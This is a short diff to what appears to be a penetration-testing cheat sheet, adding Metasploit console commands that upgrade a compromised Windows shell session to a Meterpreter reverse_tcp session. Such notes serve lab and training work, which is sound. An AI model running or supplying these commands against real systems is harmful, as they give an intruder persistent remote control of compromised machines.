@@ -650,6 +650,14 @@ Management Users can access it with WinRM.
 
 ### Upgrading a shell to meterpreter
 
+- Use
+
+      use multi/manage/shell_to_meterpreter
+      set SESSION 1
+      set PAYLOAD_OVERRIDE windows/meterpreter/reverse_tcp
+      set PLATFORM_OVERRIDE windows
+      set PSH_ARCH_OVERRIDE x64
+
 - Search for `search_to_meterpreter` with `search <keyword>`
 
 ![image](https://github.com/user-attachments/assets/3d6e3cb1-ba21-4fa1-a890-f2d729f60129)
